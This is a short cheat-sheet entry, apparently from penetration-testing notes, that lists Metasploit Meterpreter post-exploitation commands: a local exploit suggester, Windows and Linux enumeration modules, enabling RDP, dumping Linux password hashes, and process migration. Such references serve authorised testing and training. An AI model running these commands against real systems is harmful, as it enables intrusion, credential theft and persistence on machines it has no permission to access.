---
title: Meterpreter Post Modules
category: privesc
subcategory: windows-tools
os: windows
command: use post/multi/recon/local_exploit_suggester
tools: msfconsole
---


### Privilege escalation suggester

```
use post/multi/recon/local_exploit_suggester
```

### Windows enumeration modules

```
use post/windows/gather/enum_logged_on_users
use post/windows/gather/checkvm
use post/windows/gather/enum_applications
use post/windows/gather/enum_av_excluded
use post/windows/gather/enum_computers
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares
use post/windows/gather/win_privs
use post/windows/manage/enable_rdp
```

### Linux enumeration modules

```
use post/linux/gather/enum_configs
use post/multi/gather/env
use post/linux/gather/enum_network
use post/linux/gather/enum_protections
use post/linux/gather/enum_system
use post/linux/gather/checkcontainer
use post/linux/gather/enum_users_history
use post/linux/gather/hashdump
```

### Migrate to a stable process

```
run post/windows/manage/migrate
migrate <PID>
```
